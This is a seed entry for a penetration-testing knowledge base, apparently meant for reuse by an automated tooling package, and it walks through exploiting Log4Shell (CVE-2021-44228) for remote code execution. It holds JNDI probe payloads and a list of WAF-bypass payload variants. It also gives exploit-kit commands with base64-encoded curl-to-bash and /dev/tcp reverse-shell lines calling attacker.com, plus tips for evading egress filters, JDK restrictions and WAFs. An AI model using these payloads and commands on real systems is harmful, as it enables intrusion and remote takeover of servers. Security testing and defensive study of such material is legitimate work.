# [Seed] Log4Shell (CVE-2021-44228) JNDI injection to RCE

## Scenario classification
Pentest / Web RCE

## Target overview
A Java web application uses an affected Log4j2 version (< 2.17.0); logging any user-controlled field triggers JNDI remote loading. Stand up an LDAP/RMI service to serve a malicious class and gain code execution on the target.

## Full execution chain

1. Target identification
   - HTTP headers `Server`, `X-Powered-By` indicate a Java framework (Tomcat/Spring/Liferay)
   - Version fingerprinting: login page, 404 page, path disclosure
   - Vulnerability confirmation: send probe payloads through any field that gets logged (User-Agent, Referer, X-Forwarded-For, login username, search box)
2. Prepare OOB listeners
   - DNSLog platforms (dnslog.cn / interactsh / Burp Collaborator)
   - Self-hosted LDAP service (marshalsec / JNDI-Exploit-Kit)
3. Probe for the vulnerability
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   Insert into fields like User-Agent; if the DNSLog platform records a resolution for `abc123.dnslog.cn`, the target is confirmed
4. Start the exploitation service (self-hosted public VPS or ngrok reverse tunnel)
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. Fire the exploit payload
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. Get a reverse shell → follow the attack-chain for privilege escalation / persistence

## Pitfall log

| Problem | Cause | Solution | Time spent |
|---------|-------|----------|------------|
| Probe payload gets no DNS callback | Target is on an intranet with no outbound access | Use a DNS-only OOB like oast.online, or test against an internal DNSLog | 1h |
| DNS resolves but LDAP doesn't connect | Egress policy only allows DNS | Switch to DNS exfiltration directly, skip LDAP | 1.5h |
| LDAP connects but the target won't load the class | Newer JDKs (8u191+/11.0.1+/...) default `com.sun.jndi.ldap.object.trustURLCodebase=false` | Use local gadget chains like `Tomcat` / `Groovy` / `BeanFactory` (no remote class loading) | 3h |
| Double quotes escaped / payload blocked by WAF | Various ${} nesting bypasses existing rules | Use `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` nesting bypasses | 1h |
| Vulnerability triggers but no shell | Special characters in the command get mangled by Runtime.exec | Wrap in base64: `bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| Can't reproduce on a Spring Boot app | Spring uses Logback, not Log4j2 | Check the dependency tree for spring-boot-starter-log4j2 | 20min |

## Toolchain findings

- **JNDI-Exploit-Kit** (welk1n / pimps) starts LDAP+RMI+HTTP in one shot, with local gadget bypass support
- **JNDI-Injection-Exploit**: older version, supports more gadgets but unmaintained
- **Nuclei** template `cves/2021/CVE-2021-44228.yaml` is good for scanning assets for exposure
- **interactsh-client** by ProjectDiscovery — self-hosted OOB, more private than dnslog.cn
- **CrowdStrike CVE-2021-44228 scanner** detects JndiLookup.class at the binary level

## Key code/commands

WAF bypass payload set:

```text
${jndi:ldap://x.dnslog.cn/a}                    # basic
${${::-j}ndi:ldap://x.dnslog.cn/a}              # nested
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # extreme letter splitting
${jndi:dns://x.dnslog.cn}                       # DNS channel
${jndi:rmi://attacker.com:1099/a}               # RMI instead of LDAP
```

Starting interactsh:

```bash
interactsh-client -v
# Output: abc123.oast.online ← use this domain in place of dnslog in the payload
```

JNDI-Exploit-Kit one-shot exploitation:

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# Outputs several usable payloads; pick one to insert into the target
```

## Improvement suggestions for this package

- Create a dedicated `pentest-tools/references/log4shell-bypass-payloads.md` consolidating 50+ bypass payloads
- The nuclei template already ships → remind users: `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
- Add a standard checklist for "post-Log4Shell intranet entry" to attack-chain

## Reusable patterns/script snippets

**Log4Shell three-step probing**:

```text
1. Blast ${jndi:ldap://oob/a} across many fields → check the OOB platform for callbacks
2. Callback present → stand up a local-gadget LDAP (no remote class loading) → push payload
3. No callback → switch to the DNS channel for out-of-band data exfiltration
```

**Key judgments**:

```text
- DNSLog callback but LDAP unreachable → newer JDK, must use local gadgets
- Even DNS doesn't connect → internal OOB / second-order (first hit a secondary system with egress)
- Command with special characters gets no response → base64-wrap it
```

## Evolution actions
- [x] Routing matrix already has "Log4j" / "JNDI injection" keywords
- [ ] Create log4shell-bypass-payloads.md separately
- [ ] Add interactsh-client to the bootstrap manifest

## Environment info
- Attacker: Kali, Java 8 (to run the LDAP service)
- OOB platform: dnslog.cn / oast.online / self-hosted interactsh
- Target: any Java web app with Log4j2 < 2.17.0

## Anonymization requirements
This entry is seed data, written from public CVE information; no real production targets involved. All domains/IPs are placeholders.
